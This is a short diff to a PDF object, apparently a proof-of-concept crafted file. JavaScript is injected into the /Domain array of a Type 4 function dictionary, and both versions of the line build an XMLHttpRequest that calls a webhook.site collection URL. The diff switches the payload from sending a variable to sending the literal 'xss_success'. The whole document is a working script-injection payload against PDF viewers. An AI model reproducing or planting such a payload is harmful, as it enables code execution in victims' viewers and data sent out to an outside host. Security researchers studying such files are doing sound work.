@@ -2,7 +2,7 @@
 1 0 obj
 <<
   /FunctionType 4
-  /Domain [((function(){var x=new XMLHttpRequest();x.open('GET','https://webhook.site/1aceba09-6f1f-4bd8-afca-dab0603f504f?data='+xss_success,true);x.send()})()) 0]
+  /Domain [((function(){var x=new XMLHttpRequest();x.open('GET','https://webhook.site/1aceba09-6f1f-4bd8-afca-dab0603f504f?data=xss_success',true);x.send()})()) 0]
   /Range [0 0]
   /Length 12
 >>
